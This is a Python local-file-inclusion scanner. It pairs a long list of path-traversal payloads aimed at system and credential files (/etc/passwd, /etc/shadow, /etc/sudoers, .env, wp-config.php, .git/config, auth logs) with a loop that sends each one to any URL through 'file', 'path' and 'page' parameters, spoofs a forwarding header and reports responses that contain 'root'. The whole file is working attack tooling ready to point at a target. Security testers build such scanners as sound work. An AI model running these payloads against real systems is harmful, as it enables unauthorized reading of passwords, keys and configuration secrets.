import requests
import os
import urllib.parse

file_inclusion_vectors = [
    "/etc/passwd",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "../../../../etc/passwd",
    "../../../../var/log/syslog",
    "../../../../proc/self/environ",
    "../../../../etc/hostname",
    "../../../../etc/shadow",
    "../../../../etc/group",
    "../../../../etc/hosts",
    "../../../../etc/os-release",
    "../../../../proc/version",
    "../../../../proc/cpuinfo",
    "../../../../proc/meminfo",
    "../../../../var/run/utmp",
    "../../../../var/run/wtmp",
    "../../../../var/run/lastlog",
    "../../../../var/mail/root",
    "../../../../etc/services",
    "../../../../etc/ld.so.cache",
    "../../../../etc/ld.so.preload",
    "../../../../var/log/mysql/error.log",
    "../../../../var/log/httpd/access_log",
    "../../../../var/log/httpd/error_log",
    "../../../../var/log/apache2/error.log",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/error.log",
    "../../../../var/log/nginx/access.log",
    "../../../../etc/php.ini",
    "../../../../etc/php/7.4/apache2/php.ini",
    "../../../../etc/php/7.4/cli/php.ini",
    "../../../../etc/ssh/sshd_config",
    "../../../../etc/mysql/my.cnf",
    "../../../../etc/redis/redis.conf",
    "../../../../etc/nginx/nginx.conf",
    "../../../../etc/postgresql/12/main/postgresql.conf",
    "../../../../etc/crontab",
    "../../../../etc/fstab",
    "../../../../etc/sudoers",
    "../../../../etc/sysctl.conf",
    "../../../../etc/security/access.conf",
    "../../../../etc/profile",
    "../../../../etc/environment",
    "../../../../etc/bash.bashrc",
    "../../../../etc/php-fpm.d/www.conf",
    "../../../../etc/php/8.0/cli/php.ini",
    "../../../../var/log/syslog",
    "../../../../var/log/secure",
    "../../../../var/log/auth.log",
    "../../../../var/log/messages",
    "../../../../var/log/daemon.log",
    "../../../../var/log/kern.log",
    "../../../../var/log/boot.log",
    "../../../../var/log/dpkg.log",
    "../../../../var/log/apt/history.log",
    "../../../../var/log/apt/term.log",
    "../../../../var/log/Xorg.0.log",
    "../../../../var/lib/dpkg/status",
    "../../../../var/lib/dpkg/alternatives",
    "../../../../var/lib/mysql/mysql/user.frm",
    "../../../../var/lib/mysql/mysql/user.MYD",
    "../../../../var/lib/mysql/mysql/user.MYI",
    "../../../../var/www/html/index.php",
    "../../../../var/www/html/config.php",
    "../../../../var/www/html/db.php",
    "../../../../var/www/html/wp-config.php",
    "../../../../var/www/html/.env",
    "../../../../var/www/html/.git/config",
    "../../../../var/www/html/.git/HEAD",
    "../../../../var/www/html/.git/objects/pack/pack-*.pack",
    "../../../../var/www/html/.git/objects/pack/pack-*.idx",
    "../../../../var/www/html/.git/refs/heads/master",
    "../../../../var/www/html/.git/refs/remotes/origin/master",
    "../../../../var/www/html/.git/refs/tags",
    "../../../../usr/local/etc/php/php.ini",
    "../../../../usr/local/etc/php-fpm.d/www.conf",
    "../../../../usr/local/etc/php/cli/php.ini",
    "../../../../usr/local/etc/php/7.4/php.ini",
    "../../../../usr/local/etc/php/8.0/php.ini",
    "../../../../usr/local/var/log/php-fpm.log",
    "../../../../usr/local/var/run/php-fpm.sock",
    "../../../../usr/local/var/www/index.php",
    "../../../../usr/local/var/www/config.php",
    "../../../../usr/local/var/www/.env",
    "../../../../usr/local/var/www/.git/config",
    "../../../../usr/local/var/www/.git/HEAD",
    "/var/www/html/index.html",
    "/var/www/html/about.php",
    "/var/www/html/contact.php",
    "/var/www/html/admin.php",
    "/var/www/html/login.php",
    "/var/www/html/register.php",
    "/var/www/html/dashboard.php",
    "/var/www/html/user.php",
    "/var/www/html/profile.php",
    "/var/www/html/settings.php",
    "/var/www/html/upload.php",
    "/var/www/html/download.php",
    "/var/www/html/reset.php",
    "/var/www/html/reset_password.php",
    "/var/www/html/forgot_password.php",
    "/var/www/html/404.php",
    "/var/www/html/500.php",
    "/var/www/html/faq.php",
    "/var/www/html/terms.php",
    "/var/www/html/privacy.php",
    "/var/www/html/help.php",
    "/var/www/html/sitemap.php",
    "/var/www/html/news.php",
    "/var/www/html/blog.php",
    "/var/www/html/articles.php",
    "/var/www/html/archive.php",
    "/var/www/html/feed.php",
    "/var/www/html/services.php",
    "/var/www/html/products.php",
    "/var/www/html/cart.php",
    "/var/www/html/checkout.php",
    "/var/www/html/order.php",
    "/var/www/html/invoice.php",
    "/var/www/html/payment.php",
    "/var/www/html/receipt.php",
    "/var/www/html/transactions.php",
    "/var/www/html/notifications.php",
    "/var/www/html/messages.php",
    "/var/www/html/reviews.php",
    "/var/www/html/ratings.php",
    "/var/www/html/wishlist.php",
    "/var/www/html/feedback.php",
    "/var/www/html/summary.php",
    "/var/www/html/statistics.php",
    "/var/www/html/analytics.php",
    "/var/www/html/logs.php",
    "/var/www/html/settings.php",
    "/var/www/html/configurations.php",
    "/var/www/html/updates.php",
    "/var/www/html/system.php",
    "/var/www/html/database.php",
    "/var/www/html/cache.php",
    "/var/www/html/sessions.php",
    "/var/www/html/users.php",
    "/var/www/html/roles.php",
    "/var/www/html/permissions.php",
    "/var/www/html/access.php",
    "/var/www/html/security.php",
    "/var/www/html/audit.php",
    "/var/www/html/backups.php",
    "/var/www/html/restore.php",
    "/var/www/html/maintenance.php",
    "/var/www/html/setup.php",
    "/var/www/html/install.php",
    "/var/www/html/uninstall.php",
    "/var/www/html/upgrade.php",
    "/var/www/html/migrate.php",
    "/var/www/html/verify.php",
    "/var/www/html/validate.php",
    "/var/www/html/test.php",
    "/var/www/html/sandbox.php",
    "/var/www/html/demo.php",
    "/var/www/html/examples.php",
    "/var/www/html/sample.php",
    "/var/www/html/template.php",
    "/var/www/html/layout.php",
    "/var/www/html/header.php",
    "/var/www/html/footer.php",
    "/var/www/html/sidebar.php",
    "/var/www/html/menu.php",
    "/var/www/html/content.php",
    "/var/www/html/body.php",
    "/var/www/html/favicon.ico",
    "/var/www/html/robots.txt",
    "/var/www/html/.htaccess",
    "/var/www/html/.gitignore",
    "/var/www/html/contact_form.php",
    "/var/www/html/gallery.php",
    "/var/www/html/downloads.php",
    "/var/www/html/subscribe.php",
    "/var/www/html/logout.php",
    "/var/www/html/verify_email.php",
    "/var/www/html/reset_link.php",
    "/var/www/html/checkout_success.php",
    "/var/www/html/checkout_failure.php",
    "/var/www/html/terms_conditions.php",
    "/var/www/html/privacy_policy.php",
    "/var/www/html/support.php",
    "/var/www/html/faq_page.php",
    "/var/www/html/testimonials.php",
    "/var/www/html/portfolio.php",
    "/var/www/html/career.php",
    "/var/www/html/partners.php",
    "/var/www/html/press.php",
    "/var/www/html/investors.php",
    "/var/www/html/events.php",
    "/var/www/html/success_stories.php",
    "/var/www/html/our_team.php",
    "/var/www/html/mission.php",
    "/var/www/html/vision.php",
    "/var/www/html/contact_us.php",
    "/var/www/html/our_services.php",
    "/var/www/html/payment_success.php",
    "/var/www/html/payment_failure.php",
    "/var/www/html/track_order.php",
    "/var/www/html/faq_section.php",
    "/var/www/html/shipping_policy.php",
    "/var/www/html/returns_policy.php",
    "/var/www/html/special_offers.php",
    "/var/www/html/blog_post.php",
    "/var/www/html/user_guide.php",
    "/var/www/html/api_documentation.php",
    "/var/www/html/knowledge_base.php",
    "/var/www/html/release_notes.php",
    "/var/www/html/changelog.php",
    "/var/www/html/product_details.php",
    "/var/www/html/recommendations.php",
    "/var/www/html/featured_products.php",
    "/var/www/html/discounts.php",
    "/var/www/html/wishlist_items.php",
    "/var/www/html/order_history.php",
    "/var/www/html/favorites.php",
    "/var/www/html/user_profile.php",
    "/var/www/html/account_settings.php",
    "/var/www/html/security_settings.php",
    "/var/www/html/notifications_settings.php",
    "/var/www/html/language_settings.php",
    "/var/www/html/theme_settings.php",
    "/var/www/html/backup_restore.php",
    "/var/www/html/version_check.php",
    "/var/www/html/system_health.php",
    "/var/www/html/analytics_dashboard.php",
]


def format_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url

def encode_payload(payload):
    return urllib.parse.quote(payload)

def check_file_inclusion(url, payloads, callback=None):
    methods = ['GET', 'POST']
    param_types = [f"?file={encode_payload(vector)}" for vector in payloads] + \
                  [f"?path={encode_payload(vector)}" for vector in payloads] + \
                  [f"?page={encode_payload(vector)}" for vector in payloads]

    headers = {
        'User-Agent': 'File Inclusion Scanner',
        'X-Forwarded-For': '1.2.3.4',
    }

    vulnerabilities = []  

    for method in methods:
        for param in param_types:
            test_url = url + param
            try:
                if method == 'GET':
                    response = requests.get(test_url, headers=headers, timeout=5)
                else:
                    response = requests.post(test_url, headers=headers, timeout=5)

                if response.status_code == 200 and "root" in response.text:
                    if callback:
                        callback(test_url)  
                    vulnerabilities.append(test_url) 
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue

    return vulnerabilities  

def scan(url, payload_file=None, callback=None):
    url = format_url(url)
    
    if payload_file and isinstance(payload_file, str) and os.path.isfile(payload_file):
        with open(payload_file, 'r') as f:
            payloads = [line.strip() for line in f if line.strip()]
    else:
        payloads = file_inclusion_vectors

    return check_file_inclusion(url, payloads, callback)
